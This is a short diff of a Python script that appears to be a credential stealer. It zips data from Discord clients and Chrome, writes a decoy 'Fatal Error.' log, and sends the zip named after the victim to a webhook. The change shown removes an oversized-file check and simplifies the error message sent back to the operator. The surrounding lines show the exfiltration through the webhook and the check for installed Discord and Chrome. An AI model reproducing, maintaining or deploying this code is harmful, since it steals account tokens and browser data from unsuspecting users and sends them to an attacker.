@@ -78,8 +78,6 @@ else:
   chromeinst = False
 zip.close()
 
-if int(os.path.getsize(zipf)) > 8388608:
-  filetoobig = True
 def main():
   with open (temp_dir+"run.log", 'w+') as handle:
     handle.write("Fatal Error.")
@@ -88,10 +86,7 @@ def main():
   try:
     hook.send(file = File(zipf, name=str(user)+" Logs.zip"))
   except:
-    if filetoobig == True:
-      hook.send('```css\nThe Zip file was too big.```')
-    else:
-      hook.send('```css\nThere was an error obtaining the zip.```')
+    hook.send('```css\nThere was an error obtaining the zip.```')
   if discordinst and ptbinst and canaryinst and chromeinst == False:
     hook.send("```css\nUser had nothing installed```")
   try:
